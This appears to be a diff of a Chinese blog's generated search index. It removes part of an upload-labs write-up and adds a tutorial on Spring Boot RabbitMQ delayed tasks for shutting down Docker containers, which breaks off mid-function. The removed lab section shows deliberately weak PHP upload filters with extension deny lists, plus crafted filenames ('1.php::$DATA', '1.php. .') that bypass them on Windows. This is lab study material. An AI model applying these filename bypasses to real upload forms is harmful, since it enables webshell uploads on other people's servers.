class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);
-        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
-        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>
-        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);
-        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>
-        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span>
-        
-        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;
-            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
-            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.date(<span class="hljs-string">&quot;YmdHis&quot;</span>).rand(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;
-            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
-                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
-            &#125; <span class="hljs-keyword">else</span> &#123;
-                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
-            &#125;
-        &#125; <span class="hljs-keyword">else</span> &#123;
-            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;
-        &#125;
-    &#125; <span class="hljs-keyword">else</span> &#123;
-        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
-    &#125;
-&#125;</code></pre>
-
-<p>仔细观察发现少了这段代码</p>
-<pre><code class="hljs php"><span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span></code></pre>
-
-<p> 采用Windows文件流特性绕过 </p>
-<p>将文件名改为 <code>1.php::$DATA</code>,但是实质上保存的文件还是1.php</p>
-<p><img src="https://i.loli.net/2020/11/30/XKUGAeVRzTxNW8Y.png" alt></p>
-<h2 id="pass10"><a href="#pass10" class="headerlink" title="pass10"></a>pass10</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
-<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
-<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
-    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
-        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);
-        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
-        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>
-        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);
-        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>
-        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>
-        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span>
-        
-        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;
-            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
-            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;
-            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
-                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
-            &#125; <span class="hljs-keyword">else</span> &#123;
-                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
-            &#125;
-        &#125; <span class="hljs-keyword">else</span> &#123;
-            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;
-        &#125;
-    &#125; <span class="hljs-keyword">else</span> &#123;
-        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
-    &#125;
-&#125;</code></pre>
-
-<p> 这一句代码是用来检测末尾是否是<code>.</code>，可以双写绕过。<br>抓包将文件名改为<code>1.php. .</code> （注意两点之间有空格） 前面去掉.然后检验.不存在，再去空格，留下php.，然后php.不属于$deny_ext数组中存在的，当然就直接提交了。因为windows自动去点，于是php后缀就出来了 </p>
-<img src="https://i.loli.net/2020/11/30/wldCgUcOSKWPxMu.png" style="zoom:50%;">
-
-]]></content>
-      <categories>
-        <category>文件上传</category>
-        <category>代码审计</category>
-      </categories>
-      <tags>
-        <tag>MIME</tag>
-        <tag>大小写绕过</tag>
-        <tag>.htaccess</tag>
-        <tag>windows文件特性</tag>
       </tags>
   </entry>
   <entry>
@@ -4799,6 +4799,396 @@ E#---
       </categories>
       <tags>
         <tag>bfs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>delay_task</title>
+    <url>/2023/04/13/delay-task/</url>
+    <content><![CDATA[<h1 id="在Springboot中使用RabbitMQ实现倒计时执行任务"><a href="#在Springboot中使用RabbitMQ实现倒计时执行任务" class="headerlink" title="在Springboot中使用RabbitMQ实现倒计时执行任务"></a>在Springboot中使用RabbitMQ实现倒计时执行任务</h1><p> <code>死信</code>顾名思义，就是死掉的信息，英文是Dead Letter。<code>死信交换机（Dead-Letter-Exchange）</code>和普通交换机没有区别，都是可以接受信息并转发到与之绑定并能路由到的队列，区别在于<code>死信交换机</code>是转发<code>死信</code>的，而和该<code>死信交换机</code>绑定的队列就是<code>死信队列</code>。说的再通俗一点，死信交换机和死信队列其实都只是普通的交换机和队列，只不过接受、转发的信息是<code>死信</code>，其他操作并没有区别。</p>
+<h2 id="1-配置RabbitMQ"><a href="#1-配置RabbitMQ" class="headerlink" title="1.配置RabbitMQ"></a>1.配置RabbitMQ</h2><h3 id="1-1-创建交换机"><a href="#1-1-创建交换机" class="headerlink" title="1.1 创建交换机"></a>1.1 创建交换机</h3><p>交换机的存在可以将生产者发送的消息，路由到不同的queue</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20230413095908823.png" alt="image-20230413095908823"></p>
+<h3 id="1-2-创建死信队列"><a href="#1-2-创建死信队列" class="headerlink" title="1.2 创建死信队列"></a>1.2 创建死信队列</h3><ul>
+<li>x-message-ttl: 消息的存活时间，单位是ms</li>
+<li>x-dead-letter-exchange: 指定死信队列的交换机为之前创建的delay_exchange</li>
+<li>x-dead-letter-routing-key:  当消息过期之后转发到交换机key(k2)对应的队列queue</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20230413100411042.png" alt="image-20230413100411042"></p>
+<h3 id="1-3-创建普通队列"><a href="#1-3-创建普通队列" class="headerlink" title="1.3 创建普通队列"></a>1.3 创建普通队列</h3><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20230413153741198.png" alt="image-20230413153741198"></p>
+<h3 id="1-4-绑定交换机和队列"><a href="#1-4-绑定交换机和队列" class="headerlink" title="1.4 绑定交换机和队列"></a>1.4 绑定交换机和队列</h3><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20230413100759703.png" alt="image-20230413100759703"></p>
+<h3 id="1-5-代码实现"><a href="#1-5-代码实现" class="headerlink" title="1.5 代码实现"></a>1.5 代码实现</h3><p>以上步骤也能使用代码实现</p>
+<h2 id="2-springboot整合RabbitMQ"><a href="#2-springboot整合RabbitMQ" class="headerlink" title="2 springboot整合RabbitMQ"></a>2 springboot整合RabbitMQ</h2><h3 id="2-1导入依赖"><a href="#2-1导入依赖" class="headerlink" title="2.1导入依赖"></a>2.1导入依赖</h3><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--raabbitmq客户端--&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-amqp<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre>
+
+
+
+<h3 id="2-2-添加配置"><a href="#2-2-添加配置" class="headerlink" title="2.2 添加配置"></a>2.2 添加配置</h3><pre><code class="hljs yaml"><span class="hljs-attr">rabbitmq:</span>
+  <span class="hljs-attr">host:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>
+  <span class="hljs-attr">port:</span> <span class="hljs-number">5672</span>
+  <span class="hljs-attr">username:</span> <span class="hljs-string">root</span>
+  <span class="hljs-attr">password:</span> <span class="hljs-number">123456</span>
+  <span class="hljs-attr">virtual-host:</span> <span class="hljs-string">host1</span>
+  <span class="hljs-attr">listener:</span>
+    <span class="hljs-attr">type:</span> <span class="hljs-string">simple</span>
+    <span class="hljs-attr">simple:</span>
+      <span class="hljs-attr">default-requeue-rejected:</span> <span class="hljs-literal">false</span> <span class="hljs-comment"># 消息被拒绝</span>
+      <span class="hljs-attr">acknowledge-mode:</span> <span class="hljs-string">manual</span>		<span class="hljs-comment"># 手动确认消息</span></code></pre>
+
+
+
+<h3 id="2-3-创建交换机、队列并绑定"><a href="#2-3-创建交换机、队列并绑定" class="headerlink" title="2.3 创建交换机、队列并绑定"></a>2.3 创建交换机、队列并绑定</h3><p>第一节的实现，也可以使用代码实现</p>
+<p>队列名、交换机名与key</p>
+<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RabbitConstants</span> </span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String DLX_EXCHANGE = <span class="hljs-string">&quot;delay_exchange&quot;</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String DLX_ROUTING_KEY = <span class="hljs-string">&quot;k1&quot;</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String DLX_QUEUE = <span class="hljs-string">&quot;delay_queue1&quot;</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String QUEUE = <span class="hljs-string">&quot;delay_queue2&quot;</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String ROUTING_KEY = <span class="hljs-string">&quot;k2&quot;</span>;
+&#125;</code></pre>
+
+
+
+<pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sunzy.vulfocus.common.RabbitConstants;
+<span class="hljs-keyword">import</span> org.springframework.amqp.core.*;
+<span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;
+
+<span class="hljs-keyword">import</span> java.util.HashMap;
+<span class="hljs-keyword">import</span> java.util.Map;
+<span class="hljs-comment">//@Configuration</span>
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RabbitConfig</span> </span>&#123;
+
+    <span class="hljs-comment">/**</span>
+<span class="hljs-comment">     * 死信队列</span>
+<span class="hljs-comment">     * <span class="hljs-doctag">@return</span> &#123;<span class="hljs-doctag">@link</span> Queue&#125;</span>
+<span class="hljs-comment">     */</span>
+    <span class="hljs-meta">@Bean</span>
+    <span class="hljs-function"><span class="hljs-keyword">public</span> Queue <span class="hljs-title">Queue1</span><span class="hljs-params">()</span> </span>&#123;
+        Map&lt;String, Object&gt; argments = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();
+        argments.put(<span class="hljs-string">&quot;x-message-ttl&quot;</span>, <span class="hljs-number">60000</span>);<span class="hljs-comment">// 一分钟的延时</span>
+        argments.put(<span class="hljs-string">&quot;x-dead-letter-exchange&quot;</span>, RabbitConstants.DLX_EXCHANGE);
+        argments.put(<span class="hljs-string">&quot;x-dead-letter-routing-key&quot;</span>, RabbitConstants.ROUTING_KEY);
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Queue(RabbitConstants.DLX_QUEUE, <span class="hljs-keyword">true</span>, <span class="hljs-keyword">false</span>, <span class="hljs-keyword">false</span>, argments);
+    &#125;
+
+
+    <span class="hljs-meta">@Bean</span>
+    <span class="hljs-function"><span class="hljs-keyword">public</span> Queue <span class="hljs-title">Queue2</span><span class="hljs-params">()</span></span>&#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Queue(RabbitConstants.QUEUE, <span class="hljs-keyword">true</span>, <span class="hljs-keyword">false</span>, <span class="hljs-keyword">false</span>);
+    &#125;
+
+    <span class="hljs-comment">/**</span>
+<span class="hljs-comment">     * 交换机</span>
+<span class="hljs-comment">     *</span>
+<span class="hljs-comment">     * <span class="hljs-doctag">@return</span> &#123;<span class="hljs-doctag">@link</span> Exchange&#125;</span>
+<span class="hljs-comment">     */</span>
+    <span class="hljs-meta">@Bean</span>
+    <span class="hljs-function"><span class="hljs-keyword">public</span> Exchange <span class="hljs-title">orderExchange</span><span class="hljs-params">()</span> </span>&#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> DirectExchange(RabbitConstants.DLX_EXCHANGE, <span class="hljs-keyword">true</span>, <span class="hljs-keyword">false</span>, <span class="hljs-keyword">null</span>);
+    &#125;
+
+    <span class="hljs-comment">/**</span>
+<span class="hljs-comment">     * 路由键</span>
+<span class="hljs-comment">     *</span>
+<span class="hljs-comment">     * <span class="hljs-doctag">@return</span> &#123;<span class="hljs-doctag">@link</span> Binding&#125;</span>
+<span class="hljs-comment">     */</span>
+    <span class="hljs-meta">@Bean</span>
+    <span class="hljs-function"><span class="hljs-keyword">public</span> Binding <span class="hljs-title">Routing</span><span class="hljs-params">()</span> </span>&#123;
+        <span class="hljs-keyword">return</span> BindingBuilder.bind(Queue2()).to(orderExchange()).with(RabbitConstants.ROUTING_KEY).noargs();
+    &#125;
+
+
+    <span class="hljs-comment">/**</span>
+<span class="hljs-comment">     * 死信路由键</span>
+<span class="hljs-comment">     *</span>
+<span class="hljs-comment">     * <span class="hljs-doctag">@return</span> &#123;<span class="hljs-doctag">@link</span> Binding&#125;</span>
+<span class="hljs-comment">     */</span>
+    <span class="hljs-meta">@Bean</span>
+    <span class="hljs-function"><span class="hljs-keyword">public</span> Binding <span class="hljs-title">DlxRouting</span><span class="hljs-params">()</span> </span>&#123;
+        <span class="hljs-keyword">return</span> BindingBuilder.bind(Queue1()).to(orderExchange()).with(RabbitConstants.DLX_ROUTING_KEY).noargs();
+    &#125;
+&#125;
+</code></pre>
+
+<h3 id="2-4-测试代码"><a href="#2-4-测试代码" class="headerlink" title="2.4 测试代码"></a>2.4 测试代码</h3><p>生产者向交换机<code>delay_exchange</code>发送消息，并且key为k1，交换机接收消息后，会将该消息路由到<code>delay_queue1</code>，该消息会在死信队列中待60s后，转发到<code>delay_queue2</code>中</p>
+<pre><code class="hljs java"><span class="hljs-meta">@Test</span>
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">testSendAmqp</span><span class="hljs-params">()</span> </span>&#123;
+    String taskId = <span class="hljs-string">&quot;cfdf21cd13f248d3885ec47329bbb3bf&quot;</span>;
+    amqpTemplate.convertAndSend(RabbitConstants.DLX_EXCHANGE,
+            RabbitConstants.DLX_ROUTING_KEY,
+            taskId);
+    System.out.println(<span class="hljs-string">&quot;发送时间：&quot;</span> + LocalDateTime.now());
+    System.out.println(<span class="hljs-string">&quot;send message success&quot;</span>);
+&#125;</code></pre>
+
+<p>消费者这边监听<code>delay_queue2</code>中的消息</p>
+<pre><code class="hljs java"><span class="hljs-meta">@RabbitListener(queues = RabbitConstants.QUEUE, ackMode = &quot;MANUAL&quot;)</span>
+<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">getMessage</span><span class="hljs-params">(Message message, Channel channel)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;
+    System.out.println(<span class="hljs-string">&quot;接收死信队列传递的消息...&quot;</span>);
+    System.out.println(<span class="hljs-string">&quot;时间：&quot;</span> + LocalDateTime.now());
+    String taskId = <span class="hljs-keyword">new</span> String(message.getBody());
+    System.out.println(taskId);
+    channel.basicAck(message.getMessageProperties().getDeliveryTag(), <span class="hljs-keyword">false</span>);
+&#125;</code></pre>
+
+<p>测试效果如下</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20230413160512237.png" alt="image-20230413160512237"></p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20230413160457446.png" alt="image-20230413160457446"></p>
+<p>从测试结果可以看出来，时间正好相差60s，已经实现了延时执行任务的操作。</p>
+<h2 id="3-实现倒计时关闭docker容器"><a href="#3-实现倒计时关闭docker容器" class="headerlink" title="3 实现倒计时关闭docker容器"></a>3 实现倒计时关闭docker容器</h2><p>上面的延时消息的实现，主要服务于这个倒计时执行任务。</p>
+<p>有了上面的实现，再实现倒计时关闭docker容器就简单很多</p>
+<h3 id="3-1-启动容器"><a href="#3-1-启动容器" class="headerlink" title="3.1 启动容器"></a>3.1 启动容器</h3><p>首先在启动容器时，如果容器启动成功，此时需要创建一个关闭容器的任务，并将关闭容器的任务发送到死信队列中。</p>
+<pre><code class="hljs java"><span class="hljs-meta">@Async</span>
+<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">runContainer</span><span class="hljs-params">(String containerId, UserDTO user, String taskId, <span class="hljs-keyword">int</span> countdown)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;
+    ContainerVul containerVul = containerService.query().eq(<span class="hljs-string">&quot;container_id&quot;</span>, containerId).one();
+    <span class="hljs-keyword">if</span> (containerVul == <span class="hljs-keyword">null</span>) &#123;
+        <span class="hljs-keyword">throw</span> ErrorClass.ContainerNotExistsException;
+    &#125;
+    String dockerContainerId = <span class="hljs-keyword">null</span>;
+    UserUserprofile userInfo = userService.getById(user.getId());
+    dockerContainerId = containerVul.getDockerContainerId();
+    ImageInfo imageInfo = imageService.query().eq(<span class="hljs-string">&quot;image_id&quot;</span>, containerVul.getImageIdId()).one();
+    String imageName = imageInfo.getImageName();
+    String imagePort = imageInfo.getImagePort();
+    Integer userId = userInfo.getId();
+
+    Result msg = <span class="hljs-keyword">null</span>;
+    <span class="hljs-comment">/**</span>
+<span class="hljs-comment">         * 创建启动任务</span>
+<span class="hljs-comment">         */</span>
+    HashMap&lt;String, Object&gt; args = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();
+    args.put(<span class="hljs-string">&quot;imageName&quot;</span>, imageName);
+    args.put(<span class="hljs-string">&quot;userId&quot;</span>, userId);
+    args.put(<span class="hljs-string">&quot;imagePort&quot;</span>, imagePort);
+    TaskInfo taskInfo = query().eq(<span class="hljs-string">&quot;task_id&quot;</span>, taskId).one();
+    String command = <span class="hljs-string">&quot;&quot;</span>;
+    String vulFlag = containerVul.getContainerFlag();
+    String containerPort = containerVul.getContainerPort();
+
+    String vulPort = <span class="hljs-string">&quot;&quot;</span>;
+    <span class="hljs-keyword">if</span> (containerVul.getVulPort() != <span class="hljs-keyword">null</span>) &#123;
+        vulPort = containerVul.getVulPort();
+    &#125;
+    String vulHost = containerVul.getVulHost();
+    Container container = <span class="hljs-keyword">null</span>;
+    <span class="hljs-keyword">if</span> (!StrUtil.isBlank(dockerContainerId)) &#123;
+        CheckResp checkResp = checkContainer(dockerContainerId);
+        <span class="hljs-keyword">if</span> (checkResp.isFlag()) &#123;
+            container = checkResp.getContainer();
+            vulFlag = containerVul.getContainerFlag();
+        &#125;
+    &#125;
+
+    <span class="hljs-comment">// 容器被删除，此时要创建一个容器</span>
+    <span class="hljs-keyword">if</span> (container == <span class="hljs-keyword">null</span>) &#123;
+        String[] portList = imagePort.split(<span class="hljs-string">&quot;,&quot;</span>);
+        ArrayList&lt;String&gt; randomList = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();
+        HashMap&lt;String, Integer&gt; portDict = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();
+        <span class="hljs-keyword">for</span> (String port : portList) &#123;
+            String randomPort = <span class="hljs-string">&quot;&quot;</span>;
+            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">20</span>; i++) &#123;
+                randomPort = DockerTools.getRandomPort();
+                <span class="hljs-keyword">if</span> (randomList.contains(randomPort) || containerService.query().eq(<span class="hljs-string">&quot;container_port&quot;</span>, randomPort).one() != <span class="hljs-keyword">null</span>) &#123;
+                    <span class="hljs-keyword">continue</span>;
+                &#125;
+                <span class="hljs-keyword">break</span>;
+            &#125;
+            <span class="hljs-keyword">if</span> (StrUtil.isBlank(randomPort)) &#123;
+                msg = Result.fail(<span class="hljs-string">&quot;端口无效&quot;</span>);
+                <span class="hljs-keyword">break</span>;
+            &#125;
+            randomList.add(randomPort);
+            portDict.put(port + <span class="hljs-string">&quot;/tcp&quot;</span>, Integer.valueOf(randomPort));
+        &#125;
+        <span class="hljs-comment">// 端口重复无法创建</span>
+        <span class="hljs-keyword">if</span> (msg != <span class="hljs-keyword">null</span>) &#123;
+            taskInfo.setTaskMsg(JSON.toJSONString(msg));
+            taskInfo.setUpdateDate(LocalDateTime.now());
+            taskInfo.setTaskStatus(<span class="hljs-number">4</span>);
+            save(taskInfo);
+            <span class="hljs-comment">//                return taskInfo.getTaskId();</span>
+        &#125;
+        <span class="hljs-comment">// 记录端口映射</span>
+        <span class="hljs-comment">// &#123;&quot;3306&quot;: &quot;24471&quot;, &quot;80&quot;: &quot;29729&quot;&#125;</span>
+        <span class="hljs-comment">// &#123;&quot;3306&quot;:&quot;22113&quot;,&quot;8080&quot;:&quot;12345&quot;&#125;</span>
+        vulPort = JSON.toJSONString(portDict);
+        HashMap&lt;String, Integer&gt; vulPorts = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();
+        Set&lt;Map.Entry&lt;String, Integer&gt;&gt; entries = portDict.entrySet();
+        <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Integer&gt; entry : entries) &#123;
+            String port = entry.getKey().split(<span class="hljs-string">&quot;/&quot;</span>)[<span class="hljs-number">0</span>];
+            Integer tmpRandomPort = entry.getValue();
+            vulPorts.put(port, tmpRandomPort);
+        &#125;
+        <span class="hljs-keyword">try</span> &#123;
+            <span class="hljs-comment">// 只创建不启动</span>
+            dockerContainerId = DockerTools.runContainerWithPorts(imageName, vulPorts);
+            container = DockerTools.getContainerById(dockerContainerId);
+        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;
+            <span class="hljs-comment">// 修改任务状态</span>
+            msg = Result.build(<span class="hljs-string">&quot;镜像不存在&quot;</span>, <span class="hljs-keyword">null</span>);
+            taskInfo.setTaskMsg(JSON.toJSONString(msg));
+            taskInfo.setUpdateDate(LocalDateTime.now());
+            taskInfo.setTaskStatus(<span class="hljs-number">4</span>);
+            save(taskInfo);
+            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);
+        &#125;
+        vulFlag = <span class="hljs-string">&quot;flag&#123;&quot;</span> + UUID.randomUUID().toString() + <span class="hljs-string">&quot;&#125;&quot;</span>;
+        <span class="hljs-keyword">if</span> (!StrUtil.isBlank(containerVul.getContainerFlag())) &#123;
+            vulFlag = containerVul.getContainerFlag();
+        &#125;
+        command = <span class="hljs-string">&quot;touch /tmp/&quot;</span> + vulFlag;
+        vulHost = DockerTools.getLocalIp();
+    &#125;   <span class="hljs-comment">// 容器存在</span>
+    LocalDateTime taskStartDate = LocalDateTime.now();
+    LocalDateTime taskEndDate = <span class="hljs-keyword">null</span>;
+    <span class="hljs-keyword">if</span> (countdown &gt;= <span class="hljs-number">60</span>) &#123;
+        taskEndDate = taskStartDate.plusSeconds(countdown);
+    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (countdown == <span class="hljs-number">0</span>) &#123;
+
+    &#125; <span class="hljs-keyword">else</span> &#123;
+        countdown = SystemConstants.DOCKER_CONTAINER_TIME;
+        taskEndDate = taskStartDate.plusSeconds(countdown);
+    &#125;
+    <span class="hljs-keyword">assert</span> container != <span class="hljs-keyword">null</span>;
+    <span class="hljs-keyword">if</span> (container.getState().equals(<span class="hljs-string">&quot;running&quot;</span>)) &#123;
+        HashMap&lt;String, Object&gt; data = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();
